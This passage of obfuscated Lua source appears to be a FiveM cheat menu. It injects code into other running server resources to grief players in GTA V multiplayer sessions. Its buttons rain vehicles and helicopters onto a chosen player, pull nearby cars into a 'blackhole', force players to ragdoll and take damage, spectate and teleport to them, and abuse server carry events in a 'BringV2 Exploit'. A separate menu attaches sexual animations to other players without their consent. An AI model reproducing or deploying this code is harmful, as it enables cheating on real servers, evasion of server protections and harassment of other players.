        ]],v368,v368,v368,v368,v368));MachoMenuNotification("Cage","Cage created! Player ID: "   .. v368 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v125=false;local v126=nil;local v127={};local v128={"adder","comet2","elegy2","banshee","sultan"};local function v129() return v128[math.random(1 + 0 , #v128)];end local function v130(v369) local v370=0;local v371;while true do if (v370==(1443 -(496 + 947))) then v125=true;v126=GetPlayerPed(GetPlayerFromServerId(v369));v370=1359 -(1233 + 125) ;end if (v370==2) then v127={};for v783=1 + 0 ,5 + 0  do local v784=0 + 0 ;local v785;local v786;local v787;local v788;local v789;while true do if (v784==4) then SetModelAsNoLongerNeeded(v786);break;end if (v784==2) then v787=math.random( -5,1650 -(963 + 682) );v788=math.random( -(5 + 0),1509 -(504 + 1000) );v784=3 + 0 ;end if (v784==(3 + 0)) then v789=CreateVehicle(v786,v371.x + v787 ,v371.y + v788 ,v371.z,0 + 0 ,true,true);if DoesEntityExist(v789) then NetworkRegisterEntityAsNetworked(v789);local v955=NetworkGetNetworkIdFromEntity(v789);SetNetworkIdCanMigrate(v955,true);SetNetworkIdExistsOnAllMachines(v955,true);table.insert(v127,v789);end v784=5 -1 ;end if (v784==1) then RequestModel(v786);while  not HasModelLoaded(v786) do Citizen.Wait(0);end v784=2 + 0 ;end if ((0 + 0)==v784) then v785=v129();v786=GetHashKey(v785);v784=1;end end end v370=3;end if (v370==(183 -(156 + 26))) then if ( not v126 or  not DoesEntityExist(v126)) then MachoMenuNotification("Error","Player ID "   .. v369   .. " not found!" );v125=false;return;end v371=GetEntityCoords(v126);v370=2 + 0 ;end if (v370==(3 -0)) then MachoMenuNotification("Info","Blackhole started, target ID: "   .. v369 );MachoInjectResource("monitor",string.format([[
        _G.isBlackholeActive = true
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if not targetPed or not DoesEntityExist(targetPed) then
            return
        end

        Citizen.CreateThread(function()
            while _G.isBlackholeActive and DoesEntityExist(targetPed) do
                local targetCoords = GetEntityCoords(targetPed)
                local handle, vehicle = FindFirstVehicle()
                local vehicles = {}
                local success
                repeat
                    if DoesEntityExist(vehicle) then
                        local vehCoords = GetEntityCoords(vehicle)
                        if #(targetCoords - vehCoords) < 50.0 then
                            table.insert(vehicles, vehicle)
                        end
                    end
                    success, vehicle = FindNextVehicle(handle)
                until not success
                EndFindVehicle(handle)

                for _, vehicle in ipairs(vehicles) do
                    if DoesEntityExist(vehicle) then
                        NetworkRegisterEntityAsNetworked(vehicle)
                        local netId = NetworkGetNetworkIdFromEntity(vehicle)
                        SetNetworkIdCanMigrate(netId, true)
                        SetNetworkIdExistsOnAllMachines(netId, true)

                        local vehCoords = GetEntityCoords(vehicle)
                        local direction = (targetCoords - vehCoords)
                        local distance = #(targetCoords - vehCoords)
                        if distance > 2.0 then
                            local speed = 25.0
                            local velocity = direction / distance * speed
                            SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z + 5.0)
                        end
                    end
                end

                Citizen.Wait(200)
            end
        end)
    ]],v369));break;end end end local function v131() if  not v125 then local v570=164 -(149 + 15) ;while true do if (v570==0) then MachoMenuNotification("Error","Blackhole is not active!");return;end end end v125=false;v126=nil;v127={};MachoMenuNotification("Info","Blackhole stopped.");MachoInjectResource("monitor",[[
        _G.isBlackholeActive = false
    ]]);end local function v132(v372) local v373=960 -(890 + 70) ;while true do if (v373==(117 -(39 + 78))) then MachoInjectResource("monitor",string.format([[
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if not targetPed or not DoesEntityExist(targetPed) then
            TriggerEvent('chat:addMessage', { args = { '^1Error:', 'Player not found! ID: %d' } })
            return
        end
        local targetCoords = GetEntityCoords(targetPed)
        local model = "drafter"
        local modelHash = GetHashKey(model)
        RequestModel(modelHash)
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
        end
        local offsetX = math.random(-5, 5)
        local offsetY = math.random(-5, 5)
        local vehicle = CreateVehicle(modelHash, targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z, 0.0, true, true)
        if DoesEntityExist(vehicle) then
            NetworkRegisterEntityAsNetworked(vehicle)
            local netId = NetworkGetNetworkIdFromEntity(vehicle)
            SetNetworkIdCanMigrate(netId, true)
            SetNetworkIdExistsOnAllMachines(netId, true)
            TriggerEvent('chat:addMessage', { args = { '^2Info:', 'Drafter vehicle spawned, target ID: %d' } })
        end
        SetModelAsNoLongerNeeded(modelHash)
    ]],v372,v372,v372));MachoMenuNotification("Info","Drafter vehicle spawned, target ID: "   .. v372 );break;end end end local v133=MachoMenuInputbox(v91,"Target Player ID","e.g., 123");MachoMenuButton(v91,"Start Blackhole",function() if v125 then MachoMenuNotification("Error","Blackhole is already active! Stop it first.");return;end local v374=tonumber(MachoMenuGetInputbox(v133));if ( not v374 or (v374<=(482 -(14 + 468)))) then local v571=0;while true do if (v571==(0 -0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end local v375=GetPlayerFromServerId(v374);if (v375== -(2 -1)) then local v572=0 + 0 ;while true do if (v572==(0 + 0)) then MachoMenuNotification("Error","Player not found! ID: "   .. v374 );return;end end end local v376=GetPlayerPed(v375);if ( not v376 or (v376<=(0 + 0))) then local v573=0;while true do if (v573==(0 + 0)) then MachoMenuNotification("Error","Invalid player ped! ID: "   .. v374 );return;end end end v130(v374);end);MachoMenuButton(v91,"Stop Blackhole",function() v131();end);MachoMenuButton(v91,"Spawn Vehicle",function() local v377=0;local v378;local v379;local v380;while true do if (v377==(1 + 1)) then v380=GetPlayerPed(v379);if ( not v380 or (v380<=(0 -0))) then MachoMenuNotification("Error","Invalid player ped! ID: "   .. v378 );return;end v377=3;end if ((1 + 0)==v377) then v379=GetPlayerFromServerId(v378);if (v379== -(3 -2)) then MachoMenuNotification("Error","Player not found! ID: "   .. v378 );return;end v377=2;end if (v377==0) then v378=tonumber(MachoMenuGetInputbox(v133));if ( not v378 or (v378<=0)) then local v837=0;while true do if (v837==(0 + 0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v377=1;end if (v377==(54 -(12 + 39))) then v132(v378);break;end end end);local function v134() local v381=0 + 0 ;while true do if (v381==(9 -6)) then _G['vehicles']=nil;break;end if (v381==(6 -4)) then _G['isBlackholeActive']=nil;_G['targetPed']=nil;v381=3;end if (v381==(1 + 0)) then _G['StopBlackhole']=nil;_G['SpawnDrafter']=nil;v381=2;end if ((0 + 0)==v381) then _G['GetRandomVehicleModel']=nil;_G['StartBlackhole']=nil;v381=2 -1 ;end end end Citizen.CreateThread(function() Citizen.Wait(667 + 333 );v134();end);MachoMenuText(v91,"BringV2 Exploit");local v135=MachoMenuInputbox(v91,"Target ID","e.g., 668");MachoMenuButton(v91,"Start BringV2",function() local v382=tonumber(MachoMenuGetInputbox(v135));if (v382 and (v382>(0 -0))) then local v574=1710 -(1596 + 114) ;while true do if ((0 -0)==v574) then MachoMenuNotification("Carry System","Carry process started! ID: "   .. v382 );MachoInjectResource("monitor",string.format([[
            CreateThread(function()
                Wait(1000)

                local targetId = %d

                -- Start carry animation
                TriggerServerEvent('cmg2_animationsCarry:sync', 127, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, targetId, 100000, 0.0, 49, 33, 1)

                TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Trigger sent! ID: %d' } })

                -- Drop immediately after animation starts
                Wait(20)  -- Adjust this time if needed
                TriggerServerEvent("cmg2_animations:stop", targetId)

                -- Drop complete, send chat message
                TriggerEvent('chat:addMessage', { args = { '^2Carry System:', 'Drop complete! ID: ' .. targetId } })
            end)
        ]],v382,v382));break;end end else MachoMenuNotification("Error","Please enter a valid EAC ID!");end end);MachoMenuButton(v91,"All Bring - Safe",function() local v383=0;while true do if (v383==(713 -(164 + 549))) then MachoInjectResource("monitor",[[
        CreateThread(function()
            Wait(1000)

            local myPed = PlayerPedId()
            local myCoords = GetEntityCoords(myPed)
            local players = GetActivePlayers()
            local brought = 0
            local totalPlayers = 0

            -- Count how many players we need to bring
            for _, pid in ipairs(players) do
                if pid ~= PlayerId() then
                    local ped = GetPlayerPed(pid)
                    if DoesEntityExist(ped) then
                        totalPlayers = totalPlayers + 1
                    end
                end
            end

            if totalPlayers == 0 then
                TriggerEvent('chat:addMessage', { args = { '^1All Bring:', 'No players found to bring!' } })
                return
            end

            TriggerEvent('chat:addMessage', { args = { '^2All Bring:', 'Bringing ' .. totalPlayers .. ' players to you...' } })

            -- Bring each player one by one
            for _, pid in ipairs(players) do
                if pid ~= PlayerId() then
                    local ped = GetPlayerPed(pid)
                    if DoesEntityExist(ped) then
                        local targetCoords = GetEntityCoords(ped)
                        local targetName = GetPlayerName(pid)
                        local serverId = GetPlayerServerId(pid)
                        
                        -- Teleport to target
                        SetEntityCoords(myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                        Wait(150)
                        
                        -- Carry them
                        TriggerEvent('m3-smallresources:CarryHideInTrunk:carryPlayer')
                        Wait(500)
                        
                        -- Teleport back to your position
                        SetEntityCoords(myPed, myCoords.x, myCoords.y, myCoords.z, false, false, false, true)
                        Wait(200)
                        
                        -- Drop them automatically
                        TriggerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer')
                        TriggerServerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer', serverId)
                        
                        brought = brought + 1
                        print(">> Brought " .. targetName .. " (" .. brought .. "/" .. totalPlayers .. ")")
                        TriggerEvent('chat:addMessage', { args = { '^2All Bring:', 'Brought ' .. targetName .. ' (' .. brought .. '/' .. totalPlayers .. ')' } })
                        
                        Wait(300) -- Small delay before next player
                    end
                end
            end

            print(">> All " .. brought .. " players brought to you!")
            TriggerEvent('chat:addMessage', { args = { '^2All Bring:', '✅ All ' .. brought .. ' players brought to your location!' } })
        end)
    ]]);MachoMenuNotification("All Bring","Bringing all players to you one by one...");break;end end end);MachoMenuText(v91,"RainCar Spawn");local v77=MachoMenuInputbox(v91,"Vehicle Model","Enter vehicle name");MachoMenuButton(v91,"Start Vehicle Rain",function() local v384=1438 -(1059 + 379) ;local v385;while true do if (v384==(1 -0)) then MachoInjectResource("monitor",string.format([[
        if careverActive then
            print("Carever is already running.")
            return
        end

        local vehicleModel = "%s"
        careverActive = true

        Citizen.CreateThread(function()
            while careverActive do
                RequestModel(vehicleModel)
                while not HasModelLoaded(vehicleModel) do
                    Wait(100)
                end

                local playerList = GetActivePlayers()
                for _, playerId in ipairs(playerList) do
                    local ped = GetPlayerPed(playerId)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    local vehicle = CreateVehicle(vehicleModel, pos.x, pos.y, pos.z, heading, true, false)
                    SetEntityAsNoLongerNeeded(vehicle)
                end

                Citizen.Wait(350)
            end
        end)
    ]],v385));MachoMenuNotification("Troll","Vehicle rain started for everyone with model: "   .. v385 );break;end if (v384==(0 + 0)) then v385=MachoMenuGetInputbox(v77);if ((v385==nil) or (v385=="")) then MachoMenuNotification("Error","Please enter a valid vehicle model!");return;end v384=1;end end end);MachoMenuButton(v91,"Stop Vehicle Rain",function() MachoInjectResource("monitor",[[
        careverActive = false
        print("Car ever has been stopped.")
    ]]);MachoMenuNotification("Troll","Vehicle rain has been stopped.");end);MachoMenuText(v91,"Helicopter Spawn");local v136=false;local v137=nil;local v138=MachoMenuInputbox(v91,"Helicopter Rain ID","e.g., 123");MachoMenuButton(v91,"Start Helicopter Rain",function() local v386=tonumber(MachoMenuGetInputbox(v138));if ( not v386 or (v386<=(0 + 0))) then local v575=0;while true do if (v575==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end if v136 then local v576=392 -(145 + 247) ;while true do if (v576==0) then MachoMenuNotification("Warning","Already started. Use stop button to end.");return;end end end v136=true;MachoMenuNotification("Helicopter System","Rain started! Target ID: "   .. v386 );v137=CreateThread(function() while v136 do local v577=0 + 0 ;while true do if (v577==0) then MachoInjectResource("monitor",string.format([[
                local helicopterModel = "volatus"
                local targetPlayer = GetPlayerFromServerId(%d)
                if targetPlayer == -1 then return end
                local targetPed = GetPlayerPed(targetPlayer)
                if not DoesEntityExist(targetPed) then return end
                local coords = GetEntityCoords(targetPed)
                local heading = GetEntityHeading(targetPed)
                RequestModel(helicopterModel)
                while not HasModelLoaded(helicopterModel) do Wait(100) end
                local helicopter = CreateVehicle(GetHashKey(helicopterModel), coords.x, coords.y, coords.z + 10.0, heading, true, false)
                if DoesEntityExist(helicopter) then
                    SetVehicleEngineOn(helicopter, true, true, false)
                    SetEntityVelocity(helicopter, 0.0, 0.0, -50.0)
                end
            ]],v386));Wait(463 + 537 );break;end end end end);end);MachoMenuButton(v91,"Stop Helicopter Rain",function() if v136 then v136=false;v137=nil;MachoMenuNotification("Helicopter System","Helicopter rain stopped.");else MachoMenuNotification("Info","Already stopped.");end end);local v139=false;local v140=nil;local v141=MachoMenuInputbox(v91,"Target Player ID (Spectate)","e.g., 123");MachoMenuButton(v91,"Spectate Player",function() local v387=tonumber(MachoMenuGetInputbox(v141));if ( not v387 or (v387<=(0 -0))) then local v578=0;while true do if (v578==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end if  not v139 then local v579=nil;if (GetResourceState("monitor")=="started") then v579="monitor";elseif (GetResourceState("qb-core")=="started") then v579="qb-core";else v579="ox_inventory";end MachoInjectResource2(NewThreadNs,v579,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Spectate: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Spectate: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Spectate: Cannot spectate self!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'You cannot spectate yourself!' } })
                return
            end
            
            _G.spectateActive = true
            _G.spectateTargetPed = targetPed
            _G.spectateTargetId = targetServerId
            
            NetworkSetInSpectatorMode(true, targetPed)
            SetEntityVisible(PlayerPedId(), false, false)
            FreezeEntityPosition(PlayerPedId(), true)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Spectate: Spectating " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
        ]],v387));v139=true;v140=v387;MachoMenuNotification("Spectate","Spectating player ID: "   .. v387 );else local v580=0 + 0 ;local v581;while true do if (v580==(1 + 0)) then MachoInjectResource2(NewThreadNs,v581,[[
            if _G.spectateActive then
                _G.spectateActive = false
                _G.spectateTargetPed = nil
                _G.spectateTargetId = nil
                
                NetworkSetInSpectatorMode(false, PlayerPedId())
                SetEntityVisible(PlayerPedId(), true, false)
                FreezeEntityPosition(PlayerPedId(), false)
                
                print("Spectate: Stopped spectating")
                TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
            end
        ]]);v139=false;v580=2;end if ((0 -0)==v580) then v581=nil;if (GetResourceState("monitor")=="started") then v581="monitor";elseif (GetResourceState("qb-core")=="started") then v581="qb-core";else v581="ox_inventory";end v580=721 -(254 + 466) ;end if (v580==2) then v140=nil;MachoMenuNotification("Spectate","Spectate stopped");break;end end end end);MachoMenuButton(v91,"Stop Spectate",function() if v139 then local v582=nil;if (GetResourceState("monitor")=="started") then v582="monitor";elseif (GetResourceState("qb-core")=="started") then v582="qb-core";else v582="ox_inventory";end MachoInjectResource2(NewThreadNs,v582,[[
            if _G.spectateActive then
                _G.spectateActive = false
                _G.spectateTargetPed = nil
                _G.spectateTargetId = nil
                
                NetworkSetInSpectatorMode(false, PlayerPedId())
                SetEntityVisible(PlayerPedId(), true, false)
                FreezeEntityPosition(PlayerPedId(), false)
                
                print("Spectate: Stopped spectating")
                TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
            end
        ]]);v139=false;v140=nil;MachoMenuNotification("Spectate","Spectate stopped");else MachoMenuNotification("Spectate","Not currently spectating");end end);local v142=false;local v143=MachoMenuInputbox(v91,"Target Player ID (Spectate Toggle)","e.g., 123");MachoMenuButton(v91,"Spectate Toggle",function() local v388=560 -(544 + 16) ;local v389;while true do if (v388==(0 -0)) then v389=tonumber(MachoMenuGetInputbox(v143));if ( not v389 or (v389<=(628 -(294 + 334)))) then local v838=0;while true do if (v838==(253 -(236 + 17))) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v388=1 + 0 ;end if (v388==(1 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",string.format([[
        local targetServerId = %d
        
        if not _G.spectateActive then
            -- Start spectating
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Spectate: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Spectate: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Spectate: Cannot spectate self!")
                TriggerEvent('chat:addMessage', { args = { '^1Spectate:', 'You cannot spectate yourself!' } })
                return
            end
            
            _G.spectateActive = true
            _G.spectateTargetPed = targetPed
            _G.spectateTargetId = targetServerId
            
            NetworkSetInSpectatorMode(true, targetPed)
            SetEntityVisible(PlayerPedId(), false, false)
            FreezeEntityPosition(PlayerPedId(), true)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Spectate: Spectating " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Spectating ' .. targetName .. ' (ID: %d)' } })
        else
            -- Stop spectating
            _G.spectateActive = false
            _G.spectateTargetPed = nil
            _G.spectateTargetId = nil
            
            NetworkSetInSpectatorMode(false, PlayerPedId())
            SetEntityVisible(PlayerPedId(), true, false)
            FreezeEntityPosition(PlayerPedId(), false)
            
            print("Spectate: Stopped spectating")
            TriggerEvent('chat:addMessage', { args = { '^2Spectate:', 'Stopped spectating' } })
        end
    ]],v389,v389,v389));if  not v142 then local v839=0;while true do if (v839==(0 -0)) then v142=true;MachoMenuNotification("Spectate","Spectating player ID: "   .. v389 );break;end end else v142=false;MachoMenuNotification("Spectate","Spectate stopped");end break;end end end);local v144=MachoMenuInputbox(v91,"Target Player ID (S1 Teleport)","e.g., 123");MachoMenuButton(v91,"S1 Teleport to Player",function() local v390=0 -0 ;local v391;local v392;while true do if (v390==2) then if (GetResourceState("monitor")=="started") then v392="monitor";elseif (GetResourceState("qb-core")=="started") then v392="qb-core";else v392="ox_inventory";end MachoInjectResource2(NewThreadNs,v392,string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("S1 Teleport: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("S1 Teleport: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("S1 Teleport: Cannot teleport to self!")
            TriggerEvent('chat:addMessage', { args = { '^1S1 Teleport:', 'You cannot teleport to yourself!' } })
            return
        end
        
        local myPed = PlayerPedId()
        local targetName = GetPlayerName(targetPlayer)
        
        if not IsPedInAnyVehicle(targetPed, false) then
            local coords = GetEntityCoords(targetPed)
            SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
            print("S1 Teleport: Teleported to " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
        else
            local veh = GetVehiclePedIsIn(targetPed, false)
            if DoesEntityExist(veh) then
                local seatToUse = nil
                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(veh))
                
                for i = -1, maxSeats - 2 do
                    if IsVehicleSeatFree(veh, i) then
                        seatToUse = i
                        break
                    end
                end
                
                if seatToUse ~= nil then
                    SetPedIntoVehicle(myPed, veh, seatToUse)
                    print("S1 Teleport: Teleported into " .. targetName .. "'s vehicle")
                    TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported into ' .. targetName .. "'s vehicle (ID: " .. targetServerId .. ")" } })
                else
                    local coords = GetEntityCoords(veh)
                    SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
                    print("S1 Teleport: Teleported to " .. targetName .. "'s vehicle")
                    TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. "'s vehicle (ID: " .. targetServerId .. ")" } })
                end
            else
                local coords = GetEntityCoords(targetPed)
                SetEntityCoords(myPed, coords.x, coords.y, coords.z + 1.0)
                print("S1 Teleport: Teleported to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2S1 Teleport:', 'Teleported to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            end
        end
    ]],v391));break;end if ((1 + 0)==v390) then MachoMenuNotification("S1 Teleport","Teleporting to player ID: "   .. v391 );v392=nil;v390=2;end if (v390==(0 + 0)) then v391=tonumber(MachoMenuGetInputbox(v144));if ( not v391 or (v391<=(794 -(413 + 381)))) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end v390=1;end end end);local v145=MachoMenuInputbox(v91,"Target Player ID (Force Fall)","e.g., 123");MachoMenuButton(v91,"S1 Force Fall Once",function() local v393=0;local v394;local v395;while true do if (v393==(1 + 0)) then MachoMenuNotification("Force Fall","Forcing player ID: "   .. v394   .. " to fall" );v395=nil;v393=2;end if (v393==(3 -1)) then if (GetResourceState("monitor")=="started") then v395="monitor";elseif (GetResourceState("qb-core")=="started") then v395="qb-core";else v395="ox_inventory";end MachoInjectResource2(NewThreadNs,v395,string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("Force Fall: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("Force Fall: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("Force Fall: Cannot target self!")
            TriggerEvent('chat:addMessage', { args = { '^1Force Fall:', 'You cannot target yourself!' } })
            return
        end
        
        SetPedToRagdoll(targetPed, 3000, 3000, 0, true, true, false)
        ApplyDamageToPed(targetPed, 10, false, GetHashKey("WEAPON_FIRE"))
        
        local targetName = GetPlayerName(targetPlayer)
        print("Force Fall: Forced " .. targetName .. " to fall")
        TriggerEvent('chat:addMessage', { args = { '^2Force Fall:', 'Forced ' .. targetName .. ' (ID: ' .. targetServerId .. ') to fall' } })
    ]],v394));break;end if (v393==(0 -0)) then v394=tonumber(MachoMenuGetInputbox(v145));if ( not v394 or (v394<=(1970 -(582 + 1388)))) then local v840=0 -0 ;while true do if (v840==(0 + 0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v393=1;end end end);local v146=MachoMenuInputbox(v91,"Target Player ID (Copy Outfit)","e.g., 123");MachoMenuButton(v91,"S1 Copy Outfit",function() local v396=0;local v397;local v398;while true do if (v396==(365 -(326 + 38))) then MachoMenuNotification("Copy Outfit","Copying outfit from ID: "   .. v397 );v398=nil;v396=5 -3 ;end if (v396==(2 -0)) then if (GetResourceState("monitor")=="started") then v398="monitor";elseif (GetResourceState("qb-core")=="started") then v398="qb-core";else v398="ox_inventory";end MachoInjectResource2(NewThreadNs,v398,string.format([[
        local targetServerId = %d
        local targetPlayer = GetPlayerFromServerId(targetServerId)
        
        if not targetPlayer then
            print("Copy Outfit: Player not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Player not found! ID: ' .. targetServerId } })
            return
        end
        
        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then
            print("Copy Outfit: Target ped not found!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Target player not in game! ID: ' .. targetServerId } })
            return
        end
        
        if targetPed == PlayerPedId() then
            print("Copy Outfit: Cannot copy from self!")
            TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'You cannot copy from yourself!' } })
            return
        end
        
        local myPed = PlayerPedId()
        local modelmy = GetEntityModel(myPed)
        local model = GetEntityModel(targetPed)
        
        if modelmy ~= model then
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(model) then
                SetPlayerModel(PlayerId(), model)
                SetPedDefaultComponentVariation(myPed)
            else
                print("Copy Outfit: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Copy Outfit:', 'Failed to load model!' } })
                return
            end
        end
        
        for i = 0, 12 do
            local drawable = GetPedDrawableVariation(targetPed, i)
            local texture = GetPedTextureVariation(targetPed, i)
            local palette = GetPedPaletteVariation(targetPed, i)
            SetPedComponentVariation(myPed, i, drawable, texture, palette)
        end
        
        for i = 0, 10 do
            local propIndex = GetPedPropIndex(targetPed, i)
            local propTexture = GetPedPropTextureIndex(targetPed, i)
            if propIndex ~= -1 then
                SetPedPropIndex(myPed, i, propIndex, propTexture, true)
            else
                ClearPedProp(myPed, i)
            end
        end
        
        SetModelAsNoLongerNeeded(model)
        
        local targetName = GetPlayerName(targetPlayer)
        print("Copy Outfit: Copied outfit from " .. targetName)
        TriggerEvent('chat:addMessage', { args = { '^2Copy Outfit:', 'Copied outfit from ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
    ]],v397));break;end if (v396==(620 -(47 + 573))) then v397=tonumber(MachoMenuGetInputbox(v146));if ( not v397 or (v397<=0)) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end v396=1 + 0 ;end end end);local v147=MachoMenuAddTab(v4,"ERP Menu");local v148=MachoMenuGroup(v147,"ERP Operations",v3,38 -29 ,(v1.x-v3) + (243 -93) ,v1.y);local v149=MachoMenuInputbox(v148,"Target Player ID","e.g., 1");local v150=false;MachoMenuButton(v148,"Apply Animation to ID / Stop",function() local v399=MachoMenuGetInputbox(v149);if v150 then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped!");v150=false;return;end if (v399 and (v399~="")) then local v583=0;while true do if (v583==0) then MachoInjectResource("monitor",string.format([[
            local targetID = %s
            local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
            
            if targetPed and targetPed ~= 0 then
                local playerPed = PlayerPedId()
                local animDict = "rcmpaparazzo_2"
                local animName = "shag_loop_a"
                
                RequestAnimDict(animDict)
                while not HasAnimDictLoaded(animDict) do
                    Citizen.Wait(0)
                end
                
                TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
                AttachEntityToEntity(playerPed, targetPed, 11816, 0.0, -0.6, 0.0, 0.5, 0.5, 0.0, true, true, true, true, 0, true)
                
                TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied for ID ' .. targetID .. '!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
            end
        ]],v399));MachoMenuNotification("ERP System","Animation applied for ID "   .. v399   .. "!" );v583=1;end if (v583==1) then v150=true;break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v148,"Fuck Nearby",function() local v400=1664 -(1269 + 395) ;while true do if (v400==(492 -(76 + 416))) then if v150 then local v841=443 -(319 + 124) ;while true do if (v841==(0 -0)) then MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]]);MachoMenuNotification("ERP System","Animation stopped!");v841=1008 -(564 + 443) ;end if (v841==(2 -1)) then v150=false;return;end end end MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local peds = {}
        local pedHandle, ped = FindFirstPed()
        local success
        
        repeat
            if DoesEntityExist(ped) and ped ~= playerPed then
                local pedCoords = GetEntityCoords(ped)
                if Vdist(playerCoords, pedCoords) < 10.0 then
                    table.insert(peds, ped)
                end
            end
            success, ped = FindNextPed(pedHandle)
        until not success
        EndFindPed(pedHandle)
        
        local closestPed = nil
        local closestDistance = 3.0
        
        for _, ped in pairs(peds) do
            local pedCoords = GetEntityCoords(ped)
            local distance = Vdist(playerCoords, pedCoords)
            if distance < closestDistance and ped ~= playerPed then
                closestPed = ped
                closestDistance = distance
            end
        end
        
        if closestPed then
            local animDict = "rcmpaparazzo_2"
            local animName = "shag_loop_a"
            
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do
                Citizen.Wait(0)
            end
            
            TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
